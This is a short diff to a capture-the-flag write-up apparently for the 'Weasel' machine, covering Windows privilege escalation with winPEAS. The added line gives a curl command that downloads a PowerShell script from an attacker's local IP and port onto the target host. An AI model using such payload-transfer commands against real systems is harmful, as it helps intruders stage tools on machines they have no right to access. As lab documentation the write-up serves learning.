@@ -82,8 +82,8 @@ weasel.txt
 ## PrivEsc
  * **WinPEAAS**
     - We can get winPEAAS from here - `https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/WinPeas.ps1`.
-    - Performing curl is not working, hence we can do the python server method.
-    -  
+    - Performing curl is not working, hence we can do the python server method : `curl http://10.6.36.128:8000/a.ps1 --output a.ps1`.
+    - 
 
 ## Explaination Time !!
 ---
